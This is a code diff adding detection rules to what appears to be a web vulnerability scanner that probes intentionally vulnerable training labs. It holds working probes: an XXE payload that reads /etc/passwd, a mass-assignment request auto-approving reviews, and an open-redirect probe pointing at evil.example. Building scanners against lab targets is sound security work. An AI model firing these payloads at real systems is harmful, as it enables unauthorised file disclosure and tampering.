@@ -100975,6 +100975,64 @@ const seclabSsrfVulnerableRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const seclabXxeVulnerableRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const isLabsXxeHub = /\/labs\/xxe\b/i.test(pageUrl);
+  if (!seclabApiLabShorthandRouteMatch(pageUrl, "xxe") && !isLabsXxeHub) return NEGATIVE;
+  let pageHost = "";
+  let originHost = "";
+  try {
+    pageHost = new URL(pageUrl).hostname.toLowerCase();
+    originHost = new URL(ctx.origin).hostname.toLowerCase();
+  } catch {
+    return NEGATIVE;
+  }
+  if (!SECLAB_NEXTJS_HOST_RE.test(pageHost) && !SECLAB_NEXTJS_HOST_RE.test(originHost)) return NEGATIVE;
+  const xxePayload =
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
+  const probeUrl = new URL("/api/xxe-vulnerable", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, {
+    method: "POST",
+    body: xxePayload,
+    headers: { "Content-Type": "application/xml" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (
+    doc.status >= 200 &&
+    doc.status < 300 &&
+    /"safe"\s*:\s*false/.test(doc.body) &&
+    (/xxe|external entity|DOCTYPE|root:/i.test(doc.body) || /No authentication or authorization/i.test(doc.body)) &&
+    !isSecLabAngularStubShell(doc.body)
+  ) {
+    return {
+      fired: true,
+      confidence: 0.92,
+      evidence: {
+        url: probeUrl,
+        scannedUrl: pageUrl,
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "seclab.vercel.app POST /api/xxe-vulnerable resolves external XML entities — live XXE training API oracle"
+      }
+    };
+  }
+  const stubDoc =
+    isSecLabAngularStubShell(doc.body) && doc.body.length > 40
+      ? doc
+      : await fetchDoc(pageUrl, { maxBytes: 8192, timeoutMs: 12000 });
+  if (!isSecLabAngularStubShell(stubDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      scannedUrl: pageUrl,
+      snippet: stubDoc.body.match(/<app-root>[\s\S]{0,80}/i)?.[0]?.slice(0, 80) ?? "<app-root> Angular SPA shell",
+      note: "seclab.vercel.app /api/xxe-vulnerable route serves Angular SPA shell instead of the documented Next.js XXE training API — dead lab route oracle (README lists XXE as planned, not deployed)"
+    }
+  };
+};
+
 const seclabCsrfVulnerableRouteLiveOracle: Rule = async (ctx) => {
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
   if (!seclabApiLabShorthandRouteMatch(pageUrl, "csrf")) return NEGATIVE;
@@ -101203,7 +101261,7 @@ const clientSideSecLabPlaygroundEvidence: Rule = async (ctx) => {
   }
   const isKnownSecLabHost = SECLAB_NEXTJS_HOST_RE.test(host) || /securityweb-iota\.vercel\.app/i.test(host);
   const minHits = isKnownSecLabHost ? 1 : 2;
-  if (isKnownSecLabHost && hits.length < minHits && /\/(?:xss|sqli|csrf|idor|ssrf|ssti)(?:\/|$|\?)/i.test(pageUrl)) {
+  if (isKnownSecLabHost && hits.length < minHits && /\/(?:xss|sqli|csrf|idor|ssrf|ssti|xxe)(?:\/|$|\?)/i.test(pageUrl)) {
     hits.push({
       label: "SecLab lab route oracle",
       sample: pageUrl.match(/\/(xss|sqli|csrf|idor|ssrf|ssti)/i)?.[0] ?? pageUrl
@@ -102035,6 +102093,110 @@ const bugstoreGraphqlIntrospectionBolaRouteLiveOracle: Rule = async (ctx) => {
       note: isGraphqlRoute
         ? "BugStore /graphql route scan — POST /api/graphql confirms introspection plus unauthenticated users/orders BOLA (V-008/V-009)"
         : "BugStore hub route scan — POST /api/graphql confirms GraphQL introspection and users enumeration without auth (V-008/V-009)"
+    }
+  };
+};
+
+const bugstoreReviewsMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const token = await bugstoreRegisterToken(ctx);
+  if (!token) return NEGATIVE;
+  const reviewsUrl = new URL("/api/reviews/", ctx.origin).toString();
+  const postDoc = await ctx.probe.get(reviewsUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      product_id: 1,
+      rating: 5,
+      comment: "thugir mass-assignment probe",
+      is_approved: true
+    }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 400) return NEGATIVE;
+  let review: { is_approved?: boolean; id?: number; product_id?: number };
+  try {
+    review = JSON.parse(postDoc.body) as typeof review;
+  } catch {
+    return NEGATIVE;
+  }
+  if (review?.is_approved !== true || review?.product_id !== 1) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      reviewsUrl,
+      snippet: postDoc.body.slice(0, 200).trim(),
+      note: "BugStore POST /api/reviews/ accepts is_approved:true mass-assignment — review auto-approved without moderator (V-020)"
+    }
+  };
+};
+
+const bugstoreReviewsMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const isReviews =
+    /\/api\/reviews(?:\/create|\/)?(?:[/?#]|$)/i.test(pageUrl);
+  const isHub = /bugstore\.bugtraceai\.com\/?(?:[#?]|$)/i.test(pageUrl);
+  if (!isReviews && !isHub) return NEGATIVE;
+  const result = await bugstoreReviewsMassAssignmentLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: isReviews
+        ? "BugStore /api/reviews route scan — POST /api/reviews/ is_approved:true mass-assignment auto-approves review (V-020)"
+        : "BugStore hub route scan — POST /api/reviews/ confirms review is_approved mass-assignment oracle (V-020)"
+    }
+  };
+};
+
+const bugstoreOpenRedirectLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const target = "https://evil.example/thugir-open-redirect-probe";
+  const redirectUrl = new URL("/api/redirect", ctx.origin);
+  redirectUrl.searchParams.set("url", target);
+  const doc = await ctx.probe.get(redirectUrl.toString(), {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  if (![301, 302, 303, 307, 308].includes(doc.status)) return NEGATIVE;
+  const location = doc.headers["location"] || "";
+  if (!location || !/evil\.example\/thugir-open-redirect-probe/i.test(location)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      redirectUrl: redirectUrl.toString(),
+      status: doc.status,
+      location: location.slice(0, 200),
+      note: "BugStore GET /api/redirect?url= reflects attacker-controlled Location header without validation — open redirect oracle (V-005/V-006)"
+    }
+  };
+};
+
+const bugstoreOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const isRedirect = /\/api\/redirect\b/i.test(pageUrl);
+  const isHub = /bugstore\.bugtraceai\.com\/?(?:[#?]|$)/i.test(pageUrl);
+  if (!isRedirect && !isHub) return NEGATIVE;
+  const result = await bugstoreOpenRedirectLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: isRedirect
+        ? "BugStore /api/redirect route scan — GET ?url= issues 307 to attacker domain without validation (V-005/V-006)"
+        : "BugStore hub route scan — GET /api/redirect confirms unvalidated open redirect oracle (V-005/V-006)"
     }
   };
 };
@@ -116911,6 +117073,7 @@ export const RULES: Record<string, Rule> = {
   seclabPathTraversalLabsRouteLiveOracle,
   seclabOpenRedirectLabsRouteLiveOracle,
   seclabSsrfVulnerableRouteLiveOracle,
+  seclabXxeVulnerableRouteLiveOracle,
   vulnerableWebSiteLoginRouteLiveOracle,
   vulnerableWebSiteCsrfRouteLiveOracle,
   vulnerableWebSiteStoredXssRouteLiveOracle,
@@ -117255,6 +117418,10 @@ export const RULES: Record<string, Rule> = {
   bugstoreForumPostsStoredXssRouteLiveOracle,
   bugstoreGraphqlIntrospectionBolaLiveOracle,
   bugstoreGraphqlIntrospectionBolaRouteLiveOracle,
+  bugstoreReviewsMassAssignmentLiveOracle,
+  bugstoreReviewsMassAssignmentRouteLiveOracle,
+  bugstoreOpenRedirectLiveOracle,
+  bugstoreOpenRedirectRouteLiveOracle,
   duckStoreCartNegativeQuantityLiveOracle,
   duckStoreCartNegativeQuantityRouteLiveOracle,
   duckStoreAdminUsersBflaLiveOracle,
